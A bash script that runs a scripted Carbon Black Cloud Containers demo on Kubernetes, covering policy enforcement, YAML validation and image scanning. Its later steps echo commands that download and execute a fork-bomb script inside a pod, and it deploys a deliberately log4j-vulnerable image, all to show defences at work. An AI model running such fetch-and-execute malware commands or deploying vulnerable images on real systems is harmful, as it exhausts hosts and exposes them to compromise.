#!/bin/bash

RED='\033[1;31m'
GREEN='\033[1;32m'
NC='\033[0m' # No Color

# Install necessary Ubuntu packages
# Check if pv package is installed
dpkg -s pv >/dev/null
if [ $? -eq 1 ]
then
   sudo apt-get install -y pv
fi

# Check if meld package is installed
dpkg -s meld >/dev/null
if [ $? -eq 1 ]
then
   sudo apt-get install -y meld
fi

# Check that cbctl is present in the PATH
which cbctl >/dev/null
if [ $? -eq 1 ]
then
   echo -e "Please install ${RED}cbctl${NC} in your PATH"
   exit 1
fi

# if minikube exist, then define kubectl alias
which minikube >/dev/null
if [ $? -eq 0 ]
then
   shopt -s expand_aliases
   alias kubectl='minikube kubectl'
   intro="For this demo, I'm on my laptop and will use minikube."
fi

# if microk8s exist, then define kubectl alias
which microk8s >/dev/null
if [ $? -eq 0 ]
then
   shopt -s expand_aliases
   alias kubectl='microk8s kubectl'
   intro="For this demo, I'm on my laptop and will use microK8s."
fi

########################
# include the magic
########################
. demo-magic.sh

# pe  : Print and Execute.
# pei : Print and Execute immediately.
# p   : Print only.
# w   : wait
# cmd : interractive mode

clear
echo "---"
echo "Preparing demo..."

rm -f good.yaml bad.yaml >/dev/null 2>&1

microk8s kubectl delete deployment nodeapp >/dev/null 2>&1
microk8s kubectl delete service nodeapp-service >/dev/null 2>&1

microk8s kubectl delete pod log4j >/dev/null 2>&1
microk8s kubectl delete pod nginx >/dev/null 2>&1

clear
echo "---"
echo -e "${RED}VMware Carbon Black Cloud Containers${NC} can protect Kubernetes:"
wait
echo " - onprem"
wait
echo " - in public cloud, for example Amazon, Azure, or Google cloud"
wait
echo " - mikikube"
wait
echo " - microk8s"
wait
echo " - and of course VMware Tanzu."

if test -z "$intro" 
then
      echo ""
else
      wait
      echo ""
      echo ${intro}
fi

wait

echo ""
echo "---"
echo "Let's check that CBC is running in this cluster."
echo "How to check what pods are running in the K8s cluster?"
pe "kubectl get pods -A"

wait
echo ""
echo "---"
echo -e "CBC is running in it's own NAMESPACE ${GREEN}cbcontainers-dataplane${NC}."
wait

clear
echo "---"
echo "VMware CBC agent is deployed as a daemonset in each K8s cluster."
echo "It means that on each K8s node, a CBC agent will run."
echo "Daemonsets are commonly used for monitoring, networking and security solutions."
pe "kubectl get daemonsets -n cbcontainers-dataplane"
wait

clear
echo "---"
echo "We would like to deploy a node.js application called nodeapp."
echo "But before deploying it, we would like to apply a security policy."
echo -e "In CBC UI, create a policy to ${RED}BLOCK deployments with no CPU/mem quotas${NC}."
echo ""
echo "Why a minimum quota? To be sure the pod will have enough CPU/mem to run correctly"
echo "Why a maximum quota? To be sure the pod will not eat all CPU/mem, because of a bug or a cryptominer virus or someone playing Pacman..."

wait
echo ""
echo -e "We have prepared 2 deployment files, the ${GREEN}GOOD${NC} and the ${RED}BAD${NC} deployment files."
wget https://raw.githubusercontent.com/slist/K8sConfigs/main/good/deployment.yaml >/dev/null  2>&1
mv deployment.yaml good.yaml 2>/dev/null
wget https://raw.githubusercontent.com/slist/K8sConfigs/main/bad/deployment.yaml >/dev/null  2>&1
mv deployment.yaml bad.yaml 2>/dev/null
pe "ls *.yaml"

wait
echo ""
echo -e "Let's do a diff betwwen the ${GREEN}GOOD${NC} and the ${RED}BAD${NC} deployment files."
pe "meld good.yaml bad.yaml &"

wait
echo ""
echo -e "Let's try to deploy the ${RED}BAD${NC} deployment file."
pe "kubectl apply -f bad.yaml"

wait
echo ""
echo -e "Deployment of ${RED}BAD${NC} deployment file has failed."
echo "Check logs in K8s violations."
wait
echo -e "Now, Let's try to deploy the ${GREEN}GOOD${NC} deployment file."
pe "kubectl apply -f good.yaml"

wait
echo ""
echo "How to check if the app is running, and on which port is it listening?"
pe "kubectl get all"

wait
echo ""
echo "So, how to check if the app is running?"
pe "firefox http://127.0.0.1:30333 &"

wait
echo ""
echo "As a developper, how can I validate my YAML file to deploy the image?"
pe "cbctl k8s-object validate -f good.yaml"

wait
echo ""
echo -e "So, what was wrong with the ${RED}BAD${NC} deployment file?"
pe "cbctl k8s-object validate -f bad.yaml"

wait
echo ""
echo "Let's list all pods:"
pe "kubectl get pods"

firstpod=`kubectl get pods --no-headers | head -n1 | awk '{print $1;}'`

wait
echo ""
echo -e "Let's open a shell in the pod, and try to download a malware"
echo -e "${RED}wget https://raw.githubusercontent.com/slist/security-demo/master/fork-bomb.sh${NC}"
echo -e "${RED}chmod +x fork-bomb.sh${NC}"
echo -e "${RED}./fork-bomb.sh${NC}"
echo -e "Luckily we have a ${GREEN}CPU quota${NC}"
pe "kubectl exec -it ${firstpod} -- /bin/bash"

wait
echo ""
echo -e "Modify CBC K8s to ${RED}BLOCK --- COMMAND / Exec to container---${NC}"

wait
echo ""
echo -e "Let's open a shell in the pod, and try to fake the download of a malware ${RED}wget https://raw.githubusercontent.com/slist/security-demo/master/fork-bomb.sh${NC}"
pe "kubectl exec -it ${firstpod} -- /bin/bash"

wait
echo ""
echo -e "Modify CBC K8s to ${RED}BLOCK --- CONTAINER IMAGES / Critical vulnerabilities ---${NC}"
echo -e "Create an ${GREEN}exception${NC} if needed"

wait
echo "In our CICD pipeline we have integrated the automated vulnerability scan of all container images"
echo -e "Let's try to deploy an image containing a ${RED}critical vulnerability${NC}"
pe "kubectl run log4j --image=tamirmich/log4j2-demo:0.0.3"

wait
echo ""
echo -e "Let's scan a container with the ${RED}log4j vulnerability${NC} ... it will be long"
pe "cbctl image scan tamirmich/log4j2-demo:0.0.3"

echo ""
echo ""
echo -e "${GREEN}THANK YOU!${NC}"
echo ""
echo ""

